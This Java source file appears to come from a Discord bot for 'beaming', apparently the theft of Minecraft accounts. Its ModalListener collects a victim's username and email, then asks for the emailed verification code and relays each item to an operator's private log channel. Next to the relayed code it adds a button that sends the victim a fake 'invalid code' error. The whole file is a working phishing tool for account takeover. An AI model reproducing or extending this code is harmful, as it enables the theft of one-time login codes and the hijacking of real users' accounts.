package me.skinnynoonie.mcab.listener;

import me.skinnynoonie.mcab.GlobalMetadataCache;
import me.skinnynoonie.mcab.Messages;
import me.skinnynoonie.mcab.check.BeamingValidator;
import me.skinnynoonie.mcab.data.BeamSession;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.events.interaction.ModalInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.interactions.InteractionHook;

import java.util.concurrent.ExecutorService;

public final class ModalListener extends ListenerAdapter {

    private final JDA jda;
    private final ExecutorService executorService;
    private final String logChannelId;

    public ModalListener(JDA jda, ExecutorService executorService, String logChannelId) {
        this.jda = jda;
        this.executorService = executorService;
        this.logChannelId = logChannelId;
    }

    @Override
    public void onModalInteraction(ModalInteractionEvent event) {
        String modalId = event.getModalId();
        this.executorService.submit(() -> {
            if (Messages.REGISTER_FORM_MODAL.getId().equals(modalId)) {
                this.handleRegisterFormModal(event);
            }

            if (Messages.VERIFY_CODE_MODAL.getId().equals(modalId)) {
                this.handleVerifyCodeModal(event);
            }
        });
    }

    private void handleRegisterFormModal(ModalInteractionEvent event) {
        event.deferReply().setEphemeral(true).complete();

        String username = event.getValue("username").getAsString();
        String email = event.getValue("email").getAsString();

        InteractionHook hook = event.getHook();
        if (BeamingValidator.isValidUsername(username) && BeamingValidator.isValidEmailAddress(email)) {
            TextChannel logChannel = this.getLogChannelOrThrow();
            MessageEmbed registeringAccountEmbed = Messages.accountCredEmbedNotice(username, email);
            logChannel.sendMessageEmbeds(registeringAccountEmbed).complete();

            Message verifyEmailMessage = hook.editOriginalEmbeds(Messages.CHECK_EMAIL_FOR_CODE_EMBED)
                    .setActionRow(Messages.VERIFY_CODE_BUTTON).complete();

            BeamSession beamSession = new BeamSession().setUsername(username).setEmail(email);
            GlobalMetadataCache.setMetadata(verifyEmailMessage.getId(), beamSession);
        } else {
            hook.editOriginalEmbeds(Messages.INVALID_EMAIL_OR_USERNAME_EMBED).complete();
        }
    }

    private void handleVerifyCodeModal(ModalInteractionEvent event) {
        InteractionHook hook = event.deferReply().setEphemeral(true).complete();

        String code = event.getValue("code").getAsString();
        if (BeamingValidator.isValidCode(code)) {
            BeamSession beamSession = (BeamSession) GlobalMetadataCache.getMetadata(event.getMessage().getId());
            beamSession.setCode(code);
            beamSession.setVerifyingCodeMsgHook(hook);

            TextChannel logChannel = this.getLogChannelOrThrow();
            MessageEmbed newCodeNotice = Messages.newCodeRetrived(beamSession.getUsername(), beamSession.getEmail(), beamSession.getCode());
            Message newCodeNoticeMsg = logChannel.sendMessageEmbeds(newCodeNotice).addActionRow(Messages.SEND_INVALID_CODE_ERROR_BUTTON).complete();

            GlobalMetadataCache.setMetadata(newCodeNoticeMsg.getId(), beamSession);
        } else {
            hook.editOriginalEmbeds(Messages.INVALID_CODE_ERROR_EMBED).complete();
        }
    }

    private TextChannel getLogChannelOrThrow() {
        TextChannel logChannel = this.jda.getTextChannelById(this.logChannelId);
        if (logChannel == null) {
            throw new IllegalStateException("log channel is not linked properly; current value: " + this.logChannelId);
        } else {
            return logChannel;
        }
    }

}
